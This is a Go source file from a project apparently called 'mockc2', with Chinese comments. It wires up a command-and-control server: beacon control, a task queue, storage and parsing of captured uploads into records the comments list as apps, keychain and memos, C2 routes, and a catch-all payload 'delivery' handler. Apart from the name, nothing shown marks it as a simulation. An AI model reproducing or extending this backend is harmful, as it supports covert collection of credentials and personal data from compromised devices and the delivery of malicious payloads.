package server

import (
	"net/http"
	"time"

	"mockc2/internal/config"
	"mockc2/internal/store"
)

// DBConfigFromSettings 把集中配置装配为 store 连接参数（server/main 共用）。
func DBConfigFromSettings(s *config.Settings) store.DBConfig {
	return store.DBConfig{
		Host:            s.DBHost,
		Port:            s.DBPort,
		User:            s.DBUser,
		Password:        s.DBPassword,
		Name:            s.DBName,
		Params:          s.DBParams,
		MaxOpenConns:    s.DBMaxOpenConns,
		MaxIdleConns:    s.DBMaxIdleConns,
		ConnMaxLifetime: time.Duration(s.DBConnMaxLifetime) * time.Minute,
	}
}

// InitServices 服务初始化 -> 入库观察者装配（对齐 Python main.create_app）。
func InitServices(s *config.Settings) error {
	store.InitStore(s.CaptureRoot)
	// DB 先行：控制/队列/形态均依赖共享库（多实例一致；MySQL 连接池并发写）
	if err := store.InitDB(DBConfigFromSettings(s)); err != nil {
		return err
	}
	store.InitControl(s.BeaconNoop)
	store.InitQueue()
	store.InitChunkStore(s.CaptureRoot)
	store.SafeCall(func() { store.SeedRules() })
	store.SafeCall(func() { store.GetControl().EnsureSeeded() })
	initAuditWorker()

	// 入库观察者：save_body → ingest.record_packet + chunk_store 归并 + 完整解析（失败静默）。
	// dedup 命中（同端点同指纹重复回传）时跳过派生入库，并丢弃刚落盘的重复正文。
	cs := store.GetChunkStore()
	store.GetStore().AddObserver(func(ep, rel string, size int, raw []byte) {
		var pid int64
		var dup bool
		store.SafeCall(func() { pid, dup = store.RecordPacket(ep, rel, size, raw) })
		if dup {
			store.GetStore().DeleteBody(rel)
			return
		}
		if ep == "result" || ep == "nb" {
			store.SafeCall(func() { cs.ProcessResult(raw, rel) })
		}
		// 完整解析落库：u/war/nb/a/result 逐条结构化入库（apps/keychain/memos/...）
		store.SafeCall(func() { store.ProcessFull(ep, raw, pid) })
	})

	// 启动后异步回填历史 capture 数据（幂等，不阻塞服务可用）。
	go func(root string) {
		defer func() { _ = recover() }()
		_ = store.BackfillFull(root)
	}(s.CaptureRoot)
	return nil
}

// NewHandler 路由装配（catch-all 最后）+ 中间件（gzip 最外，审计次之，鉴权最内）。
func NewHandler() http.Handler {
	rt := NewRouter()

	// ── 显式业务路由（先于 catch-all 注册）──
	registerSync(rt)
	registerC2(rt)
	registerHQ(rt)
	registerL1Res(rt)
	registerOps(rt)
	registerPanel(rt)
	registerPanelEntry(rt)
	registerFeAPI(rt)
	registerDash(rt)
	registerQuery(rt)
	registerAdmin(rt)
	registerMetrics(rt)

	// ── 交付 catch-all —— 必须最后挂载 ──
	registerDelivery(rt)

	var h http.Handler = rt
	h = adminAuthMiddleware(h) // 管理授权（/admin 前台 + /__auth 登录；/__dash /__q /__* 全部守卫）
	h = corsMiddleware(h)      // CORS/OPTIONS 预检（交付链跨域 sync 必需）
	h = auditMiddleware(h)     // 审计中间件（全链路）
	h = gzipMiddleware(h)      // 传输压缩：大静态 JS ≈ -82% 字节
	h = metricsMiddleware(h)   // 运行指标（在途/状态码分布；最外层全量计）
	return h
}
